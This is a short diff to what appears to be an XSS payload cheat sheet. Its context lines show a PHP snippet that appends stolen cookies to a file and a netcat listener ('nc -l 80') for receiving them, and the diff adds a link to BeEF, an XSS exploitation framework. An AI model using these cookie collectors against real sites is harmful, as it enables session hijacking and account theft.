@@ -49,3 +49,7 @@ file_put_contents("user_session_cookies.txt", $_GET["cookie"]."\n", FILE_APPEND)
 ```
 ##### Netcat
 `nc -l 80`
+
+### Other Tools
+
+- [BeEF](http://beefproject.com/) - An automated XSS Exploitation Framework
